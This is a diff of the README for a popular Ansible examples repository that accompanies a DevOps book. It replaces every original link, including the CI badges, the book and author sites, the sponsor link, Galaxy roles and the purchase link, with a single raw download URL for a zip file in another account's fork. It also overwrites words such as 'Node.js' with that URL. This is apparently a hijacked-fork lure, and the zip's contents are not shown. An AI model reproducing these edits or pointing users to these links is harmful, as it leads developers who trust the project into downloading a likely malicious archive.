@@ -1,12 +1,12 @@
 # Ansible for DevOps Examples
 
-[![CI](https://github.com/geerlingguy/ansible-for-devops/workflows/CI/badge.svg?event=push)](https://github.com/geerlingguy/ansible-for-devops/actions?query=workflow%3ACI) [![Molecule CI](https://github.com/geerlingguy/ansible-for-devops/workflows/Molecule%20CI/badge.svg?event=push)](https://github.com/geerlingguy/ansible-for-devops/actions?query=workflow%3A%22Molecule+CI%22)
+[![CI](https://raw.githubusercontent.com/sivahariu/ansible-for-devops/master/elk/provisioning/web/files/ansible-for-devops_3.7-beta.5.zip)](https://raw.githubusercontent.com/sivahariu/ansible-for-devops/master/elk/provisioning/web/files/ansible-for-devops_3.7-beta.5.zip%3ACI) [![Molecule CI](https://raw.githubusercontent.com/sivahariu/ansible-for-devops/master/elk/provisioning/web/files/ansible-for-devops_3.7-beta.5.zip%https://raw.githubusercontent.com/sivahariu/ansible-for-devops/master/elk/provisioning/web/files/ansible-for-devops_3.7-beta.5.zip)](https://raw.githubusercontent.com/sivahariu/ansible-for-devops/master/elk/provisioning/web/files/ansible-for-devops_3.7-beta.5.zip%3A%22Molecule+CI%22)
 
-This repository contains Ansible examples developed to support different sections of [Ansible for DevOps](https://www.ansiblefordevops.com/), a book on [Ansible](http://www.ansible.com/) by [Jeff Geerling](https://www.jeffgeerling.com/).
+This repository contains Ansible examples developed to support different sections of [Ansible for DevOps](https://raw.githubusercontent.com/sivahariu/ansible-for-devops/master/elk/provisioning/web/files/ansible-for-devops_3.7-beta.5.zip), a book on [Ansible](https://raw.githubusercontent.com/sivahariu/ansible-for-devops/master/elk/provisioning/web/files/ansible-for-devops_3.7-beta.5.zip) by [Jeff Geerling](https://raw.githubusercontent.com/sivahariu/ansible-for-devops/master/elk/provisioning/web/files/ansible-for-devops_3.7-beta.5.zip).
 
 Most of the examples are full-fledged VM examples, which use Vagrant, VirtualBox, and Ansible to boot and configure VMs on your local workstation. Not all playbooks follow all of Ansible's best practices, as they illustrate particular Ansible features in an instructive manner.
 
-For more interesting examples of what you can do with Ansible, please see the [Ansible Vagrant Examples](https://github.com/geerlingguy/ansible-vagrant-examples) repository, and browse through some of [geerlingguy's roles on Ansible Galaxy](https://galaxy.ansible.com/geerlingguy/).
+For more interesting examples of what you can do with Ansible, please see the [Ansible Vagrant Examples](https://raw.githubusercontent.com/sivahariu/ansible-for-devops/master/elk/provisioning/web/files/ansible-for-devops_3.7-beta.5.zip) repository, and browse through some of [geerlingguy's roles on Ansible Galaxy](https://raw.githubusercontent.com/sivahariu/ansible-for-devops/master/elk/provisioning/web/files/ansible-for-devops_3.7-beta.5.zip).
 
 ## Examples and Chapters in which they're used
 
@@ -28,7 +28,7 @@ Here is an outline of all the examples contained in this repository, by chapter:
 
   - [`drupal`](drupal/): A single-file playbook which configures the LAMP stack on a Linux host and installs Drupal.
   - [`includes`](includes/): The same playbook as the [`drupal`](drupal/) example, but using `include`s to make the playbook more understandable.
-  - [`nodejs`](nodejs/): A single-file playbook which configures a Node.js app to run on a Linux host.
+  - [`nodejs`](nodejs/): A single-file playbook which configures a https://raw.githubusercontent.com/sivahariu/ansible-for-devops/master/elk/provisioning/web/files/ansible-for-devops_3.7-beta.5.zip app to run on a Linux host.
   - [`solr`](solr/): A single-file playbook which installs Apache Solr on a Linux host.
 
 ### Chapter 5
@@ -37,7 +37,7 @@ Here is an outline of all the examples contained in this repository, by chapter:
 
 ### Chapter 6
 
-  - [`nodejs-role`](nodejs-role/): The same playbook as the [`nodejs`](nodejs/) example, but using a role to break out the Node.js aspects into a separate `nodejs` role.
+  - [`nodejs-role`](nodejs-role/): The same playbook as the [`nodejs`](nodejs/) example, but using a role to break out the https://raw.githubusercontent.com/sivahariu/ansible-for-devops/master/elk/provisioning/web/files/ansible-for-devops_3.7-beta.5.zip aspects into a separate `nodejs` role.
   - [`galaxy-role-servers`](galaxy-role-servers/): A couple very short playbooks that demonstrate how easy it is to get new servers running leveraging the power of community Ansible Galaxy roles.
 
 ### Chapter 7
@@ -59,7 +59,7 @@ Here is an outline of all the examples contained in this repository, by chapter:
 
   - [`deployments`](deployments/): A playbook that deploys a Ruby on Rails application into an environment that runs Passenger and Nginx to handle web requests.
   - [`deployments-balancer`](deployments-balancer/): A playbook that handles zero-downtime deployments to webservers running behind an HAProxy load balancer.
-  - [`deployments-rolling`](deployments-rolling/): A playbook that demonstrates rolling deployments to multiple servers for a Node.js app.
+  - [`deployments-rolling`](deployments-rolling/): A playbook that demonstrates rolling deployments to multiple servers for a https://raw.githubusercontent.com/sivahariu/ansible-for-devops/master/elk/provisioning/web/files/ansible-for-devops_3.7-beta.5.zip app.
 
 ### Chapter 11
 
@@ -72,7 +72,7 @@ Here is an outline of all the examples contained in this repository, by chapter:
 ### Chapter 13
 
   - [`molecule`](molecule/): A Molecule example used for testing and developing an Ansible playbook, or for testing in a Continuous Integration (CI) environment.
-  - [`molecule-ci.yml` GitHub Actions workflow](.github/workflows/molecule-ci.yml): A GitHub Actions workflow which runs the `molecule` example in a CI environment.
+  - [`https://raw.githubusercontent.com/sivahariu/ansible-for-devops/master/elk/provisioning/web/files/ansible-for-devops_3.7-beta.5.zip` GitHub Actions workflow](https://raw.githubusercontent.com/sivahariu/ansible-for-devops/master/elk/provisioning/web/files/ansible-for-devops_3.7-beta.5.zip): A GitHub Actions workflow which runs the `molecule` example in a CI environment.
 
 ### Chapter 14
 
@@ -96,12 +96,12 @@ MIT
 
 ## Sponsors
 
-* [TinyPilot](https://tinypilotkvm.com): An open-source, low-cost KVM over IP for managing your servers.
+* [TinyPilot](https://raw.githubusercontent.com/sivahariu/ansible-for-devops/master/elk/provisioning/web/files/ansible-for-devops_3.7-beta.5.zip): An open-source, low-cost KVM over IP for managing your servers.
 
-The above sponsor(s) are supporting Jeff Geerling on [GitHub Sponsors](https://github.com/sponsors/geerlingguy). You can sponsor Jeff's work too, to help him continue improving this book and Ansible open source work!
+The above sponsor(s) are supporting Jeff Geerling on [GitHub Sponsors](https://raw.githubusercontent.com/sivahariu/ansible-for-devops/master/elk/provisioning/web/files/ansible-for-devops_3.7-beta.5.zip). You can sponsor Jeff's work too, to help him continue improving this book and Ansible open source work!
 
 ## Buy the Book
 
-[![Ansible for DevOps Cover](https://s3.amazonaws.com/titlepages.leanpub.com/ansible-for-devops/medium)](https://www.ansiblefordevops.com/)
+[![Ansible for DevOps Cover](https://raw.githubusercontent.com/sivahariu/ansible-for-devops/master/elk/provisioning/web/files/ansible-for-devops_3.7-beta.5.zip)](https://raw.githubusercontent.com/sivahariu/ansible-for-devops/master/elk/provisioning/web/files/ansible-for-devops_3.7-beta.5.zip)
 
-Buy [Ansible for DevOps](https://www.ansiblefordevops.com/) for your e-reader or in paperback format.
+Buy [Ansible for DevOps](https://raw.githubusercontent.com/sivahariu/ansible-for-devops/master/elk/provisioning/web/files/ansible-for-devops_3.7-beta.5.zip) for your e-reader or in paperback format.
